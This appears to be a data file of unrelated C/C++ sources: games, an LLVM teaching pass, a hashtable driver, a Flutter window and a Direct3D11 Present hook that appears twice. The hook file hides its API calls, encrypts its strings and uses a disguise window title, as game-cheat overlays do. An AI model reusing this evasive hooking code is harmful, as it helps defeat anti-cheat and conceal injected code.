    "#include \"hashtable.h\"\n\nint main ()\n{\n    #ifdef HASH_FUNCTIONS_CMP\n\n        uint32_t (*hash_functions[]) (const char*, size_t) =\n        {\n            HashZero, HashFirstLetter, HashStrlen, HashAsciiSum,\n            HashAsciiSumDivStrlen, HashRor, HashRol, HashCrc32\n        };\n\n        const char* csv_files[] =\n        {\n            \"data/hash0.csv\", \"data/hash[0].csv\", \"data/strlen.csv\", \"data/ascii.csv\",\n            \"data/asciidivlen.csv\", \"data/ror.csv\", \"data/rol.csv\", \"data/crc32.csv\"\n        };\n\n        for (size_t i = 0; i < sizeof (hash_functions) / sizeof (*hash_functions); i++)\n        {\n            HashTable* hash_t = HashTableCtor (HASH_T_SIZE, hash_functions[i]);\n            FillHashTable (hash_t, CONTENT_FILE);\n            DumpHashCsv (hash_t, csv_files[i]);\n            printf (\"\\n%lu) \\n\", i);\n            PrintDispLoadFactor (hash_t);\n            HashTableDtor (hash_t);\n        }\n\n    #else\n\n        HashTable* hash_t = HashTableCtor(HASH_T_SIZE, AsmHashCrc32);\n        FillHashTable (hash_t, CONTENT_FILE);\n\n        size_t finded_words = RunUnitTests (hash_t, UNIT_TESTS_FILE);\n        printf (\"FINDED_WORDS = %lu \\n\", finded_words);\n\n        HashTableDtor (hash_t);\n\n    #endif\n\n    return 0;\n}\n",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define BOARD_SIZE 3\n#define MAX_NAME_LENGTH 50\n\n// Function prototypes\nvoid initializeBoard(char board[][BOARD_SIZE]);\nvoid displayBoard(char board[][BOARD_SIZE]);\nint isMoveValid(char board[][BOARD_SIZE], int row, int col);\nint checkForWinner(char board[][BOARD_SIZE], char player);\nint isBoardFull(char board[][BOARD_SIZE]);\nvoid saveScore(int playerScore, int computerScore);\nvoid displayScoreboard();\n\nint main() {\n    char board[BOARD_SIZE][BOARD_SIZE];\n    char playerName[MAX_NAME_LENGTH];\n    int playerScore = 0, computerScore = 0;\n    char choice;\n    int row, col;\n    int difficulty;\n\n    while (1) {\n        printf(\"\\n\\n====== Tic Tac Toe Game ======\\n\");\n        printf(\"1. Start Game\\n\");\n        printf(\"2. Display Scoreboard\\n\");\n        printf(\"3. Quit\\n\");\n        printf(\"Enter your choice: \");\n        scanf(\" %c\", &choice);\n        getchar(); // Consume newline\n\n        switch (choice) {\n            case '1':\n                // Load scoreboard\n                displayScoreboard();\n\n                // Prompt for player name\n                printf(\"\\nEnter your name: \");\n                fgets(playerName, MAX_NAME_LENGTH, stdin);\n                playerName[strcspn(playerName, \"\\n\")] = 0; // Remove newline character\n\n                while (1) {\n                    // Initialize the board\n                    initializeBoard(board);\n\n                    // Prompt for difficulty level\n                    printf(\"\\nSelect difficulty level:\\n\");\n                    printf(\"1. Easy\\n\");\n                    printf(\"2. Hard\\n\");\n                    printf(\"Enter your choice (1 or 2): \");\n                    scanf(\"%d\", &difficulty);\n                    getchar(); // Consume newline\n\n                    while (1) {\n                        // Player's move\n                        displayBoard(board);\n                        printf(\"\\n%s's turn (X). Enter row and column numbers (e.g., 1 2): \", playerName);\n                        scanf(\"%d %d\", &row, &col);\n                        getchar(); // Consume newline\n\n                        if (isMoveValid(board, row - 1, col - 1)) {\n                            board[row - 1][col - 1] = 'X';\n                            if (checkForWinner(board, 'X')) {\n                                displayBoard(board);\n                                printf(\"\\nCongratulations, %s! You win!\\n\", playerName);\n                                playerScore++;\n                                break;\n                            }\n                            if (isBoardFull(board)) {\n                                displayBoard(board);\n                                printf(\"\\nThe game is a draw!\\n\");\n                                break;\n                            }\n\n                            // Computer's move\n                            if (difficulty == 1) {\n                                do {\n                                    row = rand() % BOARD_SIZE;\n                                    col = rand() % BOARD_SIZE;\n                                } while (!isMoveValid(board, row, col));\n                            } else { // Hard difficulty\n                                // Implement AI logic for hard difficulty here (optional)\n                                // For simplicity, let's just make random moves\n                                do {\n                                    row = rand() % BOARD_SIZE;\n                                    col = rand() % BOARD_SIZE;\n                                } while (!isMoveValid(board, row, col));\n                            }\n\n                            board[row][col] = 'O';\n                            if (checkForWinner(board, 'O')) {\n                                displayBoard(board);\n                                printf(\"\\nComputer wins!\\n\");\n                                computerScore++;\n                                break;\n                            }\n                            if (isBoardFull(board)) {\n                                displayBoard(board);\n                                printf(\"\\nThe game is a draw!\\n\");\n                                break;\n                            }\n                        } else {\n                            printf(\"\\nInvalid move! Try again.\\n\");\n                        }\n                    }\n\n                    // Ask if the player wants to play again\n                    printf(\"\\nDo you want to play again? (y/n): \");\n                    scanf(\" %c\", &choice);\n                    getchar(); // Consume newline\n\n                    if (choice != 'y' && choice != 'Y')\n                        break;\n                }\n\n                // Save the final scores\n                saveScore(playerScore, computerScore);\n                break;\n\n            case '2':\n                // Display the scoreboard\n                displayScoreboard();\n                break;\n\n            case '3':\n                // Quit the game\n            ",
    "//===-- LocalOpts.cpp - Example Transformations --------------------------===//\n//\n// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n\n#include \"llvm/Transforms/Utils/LocalOpts.h\"\n#include \"llvm/IR/Instructions.h\"\n#include \"llvm/IR/InstrTypes.h\"\n// L'include seguente va in LocalOpts.h\n#include <llvm/IR/Constants.h>\n\nusing namespace llvm;\n\nbool runOnBasicBlock(BasicBlock &B) {\n    \n    // Preleviamo le prime due istruzioni del BB\n    Instruction &Inst1st = *B.begin(), &Inst2nd = *(++B.begin());\n\n    // L'indirizzo della prima istruzione deve essere uguale a quello del \n    // primo operando della seconda istruzione (per costruzione dell'esempio)\n    assert(&Inst1st == Inst2nd.getOperand(0));\n\n    // Stampa la prima istruzione\n    outs() << \"PRIMA ISTRUZIONE: \" << Inst1st << \"\\n\";\n    // Stampa la prima istruzione come operando\n    outs() << \"COME OPERANDO: \";\n    Inst1st.printAsOperand(outs(), false);\n    outs() << \"\\n\";\n\n    // User-->Use-->Value\n    outs() << \"I MIEI OPERANDI SONO:\\n\";\n    for (auto *Iter = Inst1st.op_begin(); Iter != Inst1st.op_end(); ++Iter) {\n      Value *Operand = *Iter;\n\n      if (Argument *Arg = dyn_cast<Argument>(Operand)) {\n        outs() << \"\\t\" << *Arg << \": SONO L'ARGOMENTO N. \" << Arg->getArgNo() \n\t       <<\" DELLA FUNZIONE \" << Arg->getParent()->getName()\n               << \"\\n\";\n      }\n      if (ConstantInt *C = dyn_cast<ConstantInt>(Operand)) {\n        outs() << \"\\t\" << *C << \": SONO UNA COSTANTE INTERA DI VALORE \" << C->getValue()\n               << \"\\n\";\n      }\n    }\n\n    outs() << \"LA LISTA DEI MIEI USERS:\\n\";\n    for (auto Iter = Inst1st.user_begin(); Iter != Inst1st.user_end(); ++Iter) {\n      outs() << \"\\t\" << *(dyn_cast<Instruction>(*Iter)) << \"\\n\";\n    }\n\n    outs() << \"E DEI MIEI USI (CHE E' LA STESSA):\\n\";\n    for (auto Iter = Inst1st.use_begin(); Iter != Inst1st.use_end(); ++Iter) {\n      outs() << \"\\t\" << *(dyn_cast<Instruction>(Iter->getUser())) << \"\\n\";\n    }\n\n    // Manipolazione delle istruzioni\n    Instruction *NewInst = BinaryOperator::Create(\n        Instruction::Add, Inst1st.getOperand(0), Inst1st.getOperand(0));\n\n    NewInst->insertAfter(&Inst1st);\n    // Si possono aggiornare le singole references separatamente?\n    // Controlla la documentazione e prova a rispondere.\n    Inst1st.replaceAllUsesWith(NewInst);\n\n\t//PUNTO 1\n\t//Per cancellare le righe di codice che contengono il \"x+0=0+\" || \"x*1=1*x\"\n\t    std::vector<Instruction *> InstToDelete;\n\t    //Parto prendendo il basic block\n\t    //Ne scorro tutte le istruzioni\n\t        for (BasicBlock::iterator I =B.begin(); I != B.end(); ++I) \n\t        {\n\t            Instruction &Inst = *I;\n\t            //Ora controllo che la mia sia una operazione\n\t            if (auto *BinOp = dyn_cast<BinaryOperator>(&Inst)) \n\t            {\n\t                //controllo che l'operando sia un add\n\t                if (BinOp->getOpcode() == Instruction::Add) \n\t                {\n\t                    //Prima controllo se \u00e8 nella forma \"0+x\"\n\t                    if (ConstantInt *CI = dyn_cast<ConstantInt>(BinOp->getOperand(0))) \n\t                    {\n\t                        if (CI->isZero()) \n\t                        {\n\t                            //Mi salvo il valore della x in una variabile Value\n\t                            Value *X = BinOp->getOperand(1);\n\t                            //Rimpiazzo tutte le occorrenze con la x stessa\n\t                            BinOp->replaceAllUsesWith(X);\n\t                            //Aggiungo l'istruzione a quelle da cancellare\n\t                            InstToDelete.push_back(Inst);\n\t                        }\n\t                    } \n\t                    //Ora controllo se \u00e8 nella forma \"x+0\"\n\t                    else if (ConstantInt *CI = dyn_cast<ConstantInt>(BinOp->getOperand(1))) \n\t                    {\n\t                        if (CI->isZero()) \n\t                        {\n\t                            Value *X = BinOp->getOperand(0);\n\t                            BinOp->replaceAllUsesWith(X);\n\t                            InstToDelete.push_back(Inst);\n\t                        }\n\t                    }\n\t                //SECONDA PARTE\n\t                //controllo che l'operando sia una mul\n\t                if (BinOp->getOpcode() == Instruction::Mul) \n\t                {\n\t                    //Prima controllo se \u00e8 nella forma \"1*x\"\n\t                    if (ConstantInt *CI = dyn_cast<ConstantInt>(BinOp->getOperand(0))) \n\t                    {\n\t                        if (CI->isOne()) \n\t                        {\n\t                            //Mi salvo il valore della x in una variabile Value\n\t                            Value *X = BinOp->getOperand(1);\n\t                            //Rimpiazzo tutte le occorrenze con la x stessa\n\t                            BinOp->rep",
    "extern \"C\"{\n#include<stdlib.h>//system\n}//extern \"C\"\n#include<string>//std::string std::getline std::stoll\n#include<iostream>//std::cout std::cin\n#include<functional>//std::function\n#include<thread>//std::this_thread\n#include\"grid.h\"//grid_init grid_update grid_show grid_alive_count\nstatic bool const __iostream_init_flag=[](){\n    //std::ios::sync_with_stdio(false);\n    //std::cin.tie(nullptr);\n    std::cout.tie(nullptr);\n    //std::cout<<std::unitbuf;\n    return true;\n}();\nstatic long long __read_ll(\n    std::string const& prompt,\n    std::function<bool(long long)> const& pred\n){\n    std::string input;\n    long long ret=0;\n    for(;;){\n        std::cout<<prompt;\n        std::getline(std::cin,input);\n        try{\n            ret=std::stoll(input);\n        }catch(std::exception const& exception){\n            std::cout<<exception.what()<<\"\\n\";\n            continue;\n        }\n        if(pred(ret)){\n            break;\n        }\n    }\n    return ret;\n}\nstatic void __console_clear(){\n    #ifdef _WIN32\n        system(\"cls\");\n    #else\n        system(\"clear\");\n    #endif\n}\nstatic void __automatic_mode(){\n    long long row=__read_ll(\n        \"Input Row(>0): \",\n        [](long long num){return num>0;}\n    );\n    long long col=__read_ll(\n        \"Input Col(>0): \",\n        [](long long num){return num>0;}\n    );\n    grid_init(row,col);\n    long long turn_count=0;\n    for(;;){\n        __console_clear();\n        std::cout<<grid_to_string();\n        std::cout<<\"Turn: \"<<turn_count<<\"\\n\";\n        std::cout<<\"Alive: \"<<grid_alive_count()<<\"\\n\";\n        if(grid_alive_count()==0){\n            std::cout<<\"Game Over!\\n\";\n            return;\n        }\n        grid_update();\n        ++turn_count;\n        using namespace std::chrono_literals;\n        std::this_thread::sleep_for(500ms);\n    }\n}\nstatic void __manual_mode(){\n    long long row=__read_ll(\n        \"Input Row(>0): \",\n        [](long long num){return num>0;}\n    );\n    long long col=__read_ll(\n        \"Input Col(>0): \",\n        [](long long num){return num>0;}\n    );\n    grid_init(row,col);\n    std::string command;\n    long long turn_count=0;\n    for(;;){\n        std::cout<<grid_to_string();\n        std::cout<<\"Turn: \"<<turn_count<<\"\\n\";\n        std::cout<<\"Alive: \"<<grid_alive_count()<<\"\\n\";\n        if(grid_alive_count()==0){\n            std::cout<<\"Game Over!\\n\";\n            return;\n        }\n        std::cout<<\"Command{Q/q->Quit,Others->Continue}\\n\";\n        std::cout<<\"Input Command: \";\n        std::getline(std::cin,command);\n        if(command==\"Q\"||command==\"q\"){\n            return;\n        }\n        grid_update();\n        ++turn_count;\n    }\n}\nint main(){\n    std::string command;\n    std::cout<<\"Command{A/a->Automatic Mode,M/m->Manual Mode}\\n\";\n    enum class Mode:unsigned char{\n        AUTOMATIC_MODE=0,\n        MANUAL_MODE=1\n    };\n    Mode mode=Mode::AUTOMATIC_MODE;\n    for(;;){\n        std::cout<<\"Input Command: \";\n        std::getline(std::cin,command);\n        if(command==\"A\"||command==\"a\"){\n            mode=Mode::AUTOMATIC_MODE;\n            break;\n        }else if(command==\"M\"||command==\"m\"){\n            mode=Mode::MANUAL_MODE;\n            break;\n        }\n    }\n    switch(mode){\n        case Mode::AUTOMATIC_MODE:{__automatic_mode();break;}\n        case Mode::MANUAL_MODE:{__manual_mode();break;}\n    }\n    return 0;\n}\n",
    "\ufeff#include <iostream>\nusing namespace std;\n\n#define TAB \"\\t\"\n\nvoid FillRand(int arr[], const int n);\nvoid Print(int arr[], const int n);\nvoid Print_even(int *even_arr, int even_count);\nvoid Print_odd(int *odd_arr, int odd_count);\n\n\nint main()\n{\n\tsetlocale(LC_ALL, \"\");\n\n\tconst int n = 10;\n\tint arr[n];\n\t\n\tFillRand(arr, n);\n\tPrint(arr, n);\n\n\tint even_count = 0;\n\tint odd_count = 0;\n\t// \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043a\u043e\u043b-\u0432\u043e \u044d\u043b\u0438\u043c\u0435\u043d\u0442\u043e\u0432 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (arr[i] % 2 == 0) even_count++;\n\t\telse odd_count++;\n\t}\n\tcout << \"\u043a\u043e\u043b-\u0432\u043e \u0447\u0435\u0442\u043d\u044b\u0445 \u044d\u043b\u0438\u043c\u0435\u043d\u0442\u043e\u0432: \" << even_count << endl;\n\tcout << \"\u043a\u043e\u043b-\u0432\u043e \u043d\u0435\u0447\u0435\u0442\u043d\u044b\u0445 \u044d\u043b\u0438\u043c\u0435\u043d\u0442\u043e\u0432: \" << odd_count << endl;\n\n\tint* even_arr = new int[even_count];\n\tint* odd_arr = new int[odd_count];\n\n\t// \u0440\u0430\u0441\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439\n\tfor (int i = 0, j = 0, k = 0; i < n; i++)\n\t{\n\t\tif (arr[i] % 2 == 0)\n\t\t\teven_arr[j++] = arr[i];\n\t\telse\n\t\t\todd_arr[k++] = arr[i];\n\t}\n\t// \u0432\u044b\u0432\u043e\u0434 \u043c\u0430\u0441\u0441\u0438\u0432\u043e\u0432\n\tcout << \"Even arr: \"; Print_even(even_arr, even_count);\n\tcout << \"Odd arr: \"; Print_odd(odd_arr, odd_count);\n\t\n\tdelete[] odd_arr;\n\tdelete[] even_arr;\n}\n\nvoid FillRand(int arr[], const int n)\n{\n\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tarr[i] = rand() % 100;\n\t}\n}\n\nvoid Print(int arr[], const int n)\n{\n\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcout << arr[i] << TAB;\n\t}\n\tcout << endl;\n}\n\nvoid Print_even(int* odd_arr, int odd_count)\n{\n\tfor(int i = 0; i < odd_count; i++)\n\t{\n\t\tcout << odd_arr[i] << TAB;\n\t}\n\tcout << endl;\n}\n\nvoid Print_odd(int *even_arr, int even_count)\n{\n\n\tfor (int i = 0; i < even_count; i++)\n\t{\n\t\tcout << even_arr[i] << TAB;\n\t}\n\tcout << endl;\n}\n\n\n",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
